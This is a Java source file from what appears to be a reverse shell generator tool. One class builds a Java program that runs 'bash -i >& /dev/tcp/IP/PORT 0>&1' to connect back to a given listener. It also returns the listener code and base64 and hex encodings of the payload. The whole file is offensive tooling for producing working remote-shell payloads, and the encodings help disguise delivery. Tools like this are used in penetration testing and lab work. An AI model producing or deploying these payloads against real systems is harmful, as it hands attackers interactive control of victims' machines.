package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Java_2 extends Reverse {

    protected String shellFormat = "";

    public Java_2(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$| bash -i >& /dev/tcp/%s/%s 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}", this.getLocalIP(), this.getLocalPort());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
 
}